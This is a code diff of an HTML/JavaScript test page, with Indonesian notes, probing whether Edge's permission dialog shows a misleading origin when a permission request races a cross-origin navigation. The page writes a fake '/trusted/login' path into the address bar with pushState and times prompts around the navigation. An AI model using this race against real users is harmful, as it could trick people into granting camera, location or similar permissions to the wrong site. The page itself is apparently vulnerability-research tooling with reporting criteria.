@@ -69,7 +69,8 @@ test <b>Edge Stable dulu</b> → bandingkan <b>Edge Canary</b>. Origin sama = bu
     </select>
   </label>
   <button onclick="runRace()">JALANKAN 1x</button>
-  <button onclick="runLoop()">ULANG 5x otomatis</button>
+  <span style="font-size:12px;color:#888;">Ulang 5x manual: JALANKAN → observasi → tekan Back → JALANKAN lagi.
+  (Loop otomatis tidak mungkin: halaman diunload saat nav, semua timer mati.)</span>
 </fieldset>
 
 <pre id="log"></pre>
@@ -84,7 +85,7 @@ test <b>Edge Stable dulu</b> → bandingkan <b>Edge Canary</b>. Origin sama = bu
    izin tercatat untuk <span class="hit">origin mana</span>?<br>
 5. Mode B: dialog muncul SETELAH nav dijalankan — origin yang ditulis dialog =<br><br>
 <b>HIT (laporkan):</b> dialog menyebut <b>origin target</b> padahal request dari github.io,
-atau izin tercatat di origin yang salah, atau bar+dialog+tampilkan dua origin berbeda secara
+atau izin tercatat di origin yang salah, atau bar dan dialog menampilkan dua origin berbeda secara
 konsisten diulang ≥3 dari 5 percobaan.<br>
 <b>BUKAN BUG:</b> dialog menutup segera saat nav mulai, atau origin di dialog selalu github.io (benar),
 atau gagal karena permission sudah pernah di-decide.
@@ -119,36 +120,31 @@ function runRace(){
   log('=== MODE '+mode.toUpperCase()+' | perm='+perm+' | delay='+delay+'ms ===');
   log('origin sebelum: '+location.origin);
 
-  history.pushState({}, '', '/trusted/login?session=secure');
-  log('pushState → bar sementara: '+cur());
+  try {
+    history.pushState({}, '', '/trusted/login?session=secure');
+    log('pushState → bar sementara: '+cur());
+  } catch(e) {
+    log('pushState gagal ('+e.name+') — lanjut tanpa path palsu (ini penting cuma utk tampilan bar)');
+  }
 
   if(mode==='prompt-first'){
     askPermission(perm);
     log('nav dijadwalkan +'+delay+'ms → '+target);
     setTimeout(function(){ log('NAV EKSEKUSI (cek dialog vs bar SEKARANG)'); location.href=target; }, delay);
   } else {
-    log('nav dijalankan dulu → '+target);
+    log('nav dulu → '+target);
+    log('CATATAN: pakai target slow-commit. Target cepat bisa commit duluan → dialog tak keburu muncul = BUKAN BUG.');
     location.href=target;
-    // selama nav belum commit, script asal masih hidup → buka prompt
-    requestAnimationFrame(function(){ requestAnimationFrame(function(){
-      log('NAV pending → prompt dibuka sekarang (cek origin di dialog)'); 
+    // nav bersifat async: di tick INI script asal masih hidup, jadi prompt
+    // diminta sebelum commit — satu kali saja, jangan dobel.
+    if(delay<=0){
+      log('prompt dibuka di tick yang sama (nav masih pending) — cek origin dialog vs bar');
       askPermission(perm);
-    });});
-    if(delay>0){ setTimeout(function(){ try{ askPermission(perm); }catch(e){} }, delay); }
+    } else {
+      log('prompt dibuka +'+delay+'ms (nav masih pending) — cek origin dialog vs bar');
+      setTimeout(function(){ askPermission(perm); }, delay);
+    }
   }
-}
-
-var loopN=0;
-function runLoop(){
-  loopN=0;
-  log('>>> LOOP 5x — catat tiap iterasi di tabel observasi');
-  (function step(){
-    if(loopN>=5){ log('>>> LOOP SELESAI. Ulangi utk Canary.'); return; }
-    loopN++;
-    log('--- iterasi '+loopN+'/5 ---');
-    runRace();
-    setTimeout(step, 9000); // beri waktu httpbin delay 8s selesai/timeout sebelum run berikutnya
-  })();
 }
 
 log('Target halaman: '+location.origin+' (harus github.io — nav ke opsi lain = cross-origin)');
